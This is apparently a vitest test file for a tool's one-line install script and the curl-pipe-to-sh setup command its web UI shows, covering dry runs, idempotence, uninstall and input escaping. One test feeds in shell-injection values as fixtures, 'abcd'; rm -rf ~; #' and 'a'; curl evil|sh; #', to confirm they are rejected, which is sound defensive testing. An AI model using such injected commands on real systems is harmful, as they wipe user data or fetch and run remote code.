// ONBOARDING O3 — the one-line install path.
//
// These tests protect the two properties that make the pasted line safe: the
// script is a rehearsable, syntactically valid POSIX program, and the command
// the web UI renders cannot be turned into a second shell command by a hostile
// origin, runner id or pairing code.
import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { helperServicePath, normalizePairingCode } from "@norns/runner";
import { describe, expect, it } from "vitest";
import {
  helperStatus,
  installCommand,
  installCommandWindows,
} from "../src/runners/helperOnboarding.js";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..");
const script = join(repoRoot, "scripts", "install-runner.sh");

function runScript(args: string[], env: NodeJS.ProcessEnv = {}): string {
  return execFileSync("sh", [script, ...args], {
    encoding: "utf8",
    env: { ...process.env, ...env },
  });
}

describe("local helper install script", () => {
  it("is a syntactically valid POSIX shell program", () => {
    expect(() => execFileSync("sh", ["-n", script], { encoding: "utf8" })).not.toThrow();
  });

  it("passes shellcheck when shellcheck is available", () => {
    let available = true;
    try {
      execFileSync("shellcheck", ["--version"], { stdio: "ignore" });
    } catch {
      available = false;
    }
    if (!available) return; // shellcheck is not installed in every CI image
    expect(() =>
      execFileSync("shellcheck", ["--shell=sh", script], { encoding: "utf8" }),
    ).not.toThrow();
  });

  it("rehearses a full install without touching the filesystem", () => {
    const home = mkdtempSync(join(tmpdir(), "norns-install-home-"));
    const output = runScript(
      ["--dry-run", "--server", "https://relay.example", "--pair", "abcd1234"],
      { HOME: home, NORNS_HOME: join(home, ".norns") },
    );

    // Every step is announced...
    expect(output).toContain("git clone");
    expect(output).toContain("pnpm --filter @norns/runner... run build");
    expect(output).toContain("pair abcd1234");
    expect(output).toMatch(/launchctl bootstrap|systemctl --user enable/);
    // ...and nothing was actually created.
    expect(existsSync(join(home, ".norns", "helper"))).toBe(false);
    expect(existsSync(helperServicePath(home))).toBe(false);
  });

  it("registers a login item so the helper is there after a reboot", () => {
    const home = mkdtempSync(join(tmpdir(), "norns-install-login-"));
    const output = runScript(
      ["--dry-run", "--server", "https://relay.example", "--pair", "abcd1234"],
      { HOME: home, NORNS_HOME: join(home, ".norns") },
    );
    expect(output).toContain(`write ${helperServicePath(home)}`);
  });

  it("is idempotent: a rehearsed re-run repairs rather than duplicating", () => {
    const home = mkdtempSync(join(tmpdir(), "norns-install-repeat-"));
    const args = ["--dry-run", "--server", "https://relay.example", "--pair", "abcd1234"];
    const env = { HOME: home, NORNS_HOME: join(home, ".norns") };
    expect(runScript(args, env)).toBe(runScript(args, env));
    // The service is always torn down before it is brought up again, which is
    // what stops a second copy of the helper from being registered.
    const output = runScript(args, env);
    const boots = output.split("\n").filter((line) => line.includes("bootstrap"));
    expect(boots).toHaveLength(1);
    expect(output.indexOf("bootout")).toBeLessThan(output.indexOf("bootstrap"));
  });

  it("uninstalls, and only deletes pairing keys and grants when asked", () => {
    const home = mkdtempSync(join(tmpdir(), "norns-install-remove-"));
    const env = { HOME: home, NORNS_HOME: join(home, ".norns") };
    const kept = runScript(["--dry-run", "--uninstall"], env);
    expect(kept).toContain(`rm -f ${helperServicePath(home)}`);
    expect(kept).not.toContain(`rm -rf ${join(home, ".norns", "runner-1")}`);
    expect(kept).toContain("use --purge to delete them");

    const purged = runScript(["--dry-run", "--uninstall", "--purge"], env);
    expect(purged).toContain(`rm -rf ${join(home, ".norns", "runner-1")}`);
  });

  it("refuses to run without a relay URL rather than half-installing", () => {
    const home = mkdtempSync(join(tmpdir(), "norns-install-noserver-"));
    expect(() => runScript(["--dry-run"], { HOME: home, NORNS_SERVER: "" })).toThrow(
      /--server URL is required/,
    );
  });
});

describe("the setup line the web UI renders", () => {
  it("is a single pasteable line carrying the one-time code", () => {
    expect(installCommand({ origin: "https://relay.example", code: "abcd1234" })).toBe(
      "curl -fsSL 'https://relay.example/install/runner.sh' | sh -s -- --server 'https://relay.example' --pair 'abcd1234'",
    );
    expect(installCommandWindows({ origin: "https://relay.example", code: "abcd1234" })).toContain(
      "-Pair 'abcd1234'",
    );
  });

  it("omits the default runner id and includes a non-default one", () => {
    expect(installCommand({ origin: "https://relay.example", runnerId: "runner-1" })).not.toContain(
      "--id",
    );
    expect(installCommand({ origin: "https://relay.example", runnerId: "laptop" })).toContain(
      "--id 'laptop'",
    );
  });

  it("cannot be turned into a second shell command", () => {
    // The line is pasted into a terminal, so quote-escaping is a real boundary.
    expect(() =>
      installCommand({ origin: "https://relay.example", code: "abcd'; rm -rf ~; #" }),
    ).toThrow(/unsafe pairing code/);
    expect(() =>
      installCommand({ origin: "https://relay.example", runnerId: "a'; curl evil|sh; #" }),
    ).toThrow(/unsafe runner id/);
    expect(() => installCommand({ origin: "file:///etc" })).toThrow(/http or https/);
    expect(installCommand({ origin: "https://relay.example/some/path?x=1" })).not.toContain(
      "/some/path",
    );
  });
});

describe("pairing codes survive being pasted by a human", () => {
  it("tolerates spacing, grouping dashes, case and the deep link form", () => {
    expect(normalizePairingCode("  ABCD 1234 ")).toBe("abcd1234");
    expect(normalizePairingCode("abcd-1234")).toBe("abcd1234");
    expect(normalizePairingCode("norns-pair:ABCD-1234")).toBe("abcd1234");
  });

  it("does not widen the alphabet the relay accepts", () => {
    // Normalization must not smuggle anything past the relay's own check; it
    // only removes separators and lowercases.
    expect(normalizePairingCode("abcd$1234")).toBe("abcd$1234");
    expect(normalizePairingCode("")).toBe("");
  });
});

describe("helper status collapses to one signal the UI can render", () => {
  const runner = (over: Partial<Parameters<typeof helperStatus>[0][number]> = {}) => ({
    runner_id: "runner-1",
    generation: 1,
    connected: true,
    workspace_picker_ready: true,
    folder_revoke_ready: true,
    last_seen_at: null,
    ...over,
  });

  it("reports not_installed before any helper has ever paired", () => {
    expect(helperStatus([])).toMatchObject({ state: "not_installed", runner_id: null });
  });

  it("reports connected only when the folder chooser is actually usable", () => {
    expect(helperStatus([runner()])).toMatchObject({ state: "connected", runner_id: "runner-1" });
    expect(helperStatus([runner({ workspace_picker_ready: false })])).toMatchObject({
      state: "degraded",
    });
  });

  it("distinguishes an offline helper from one that was never installed", () => {
    const offline = helperStatus([runner({ connected: false, workspace_picker_ready: false })]);
    expect(offline.state).toBe("disconnected");
    expect(offline.message).toContain("not reachable");
  });

  it("prefers a usable helper over an out-of-date one", () => {
    const status = helperStatus([
      runner({ runner_id: "old", workspace_picker_ready: false }),
      runner({ runner_id: "new" }),
    ]);
    expect(status).toMatchObject({ state: "connected", runner_id: "new" });
  });
});
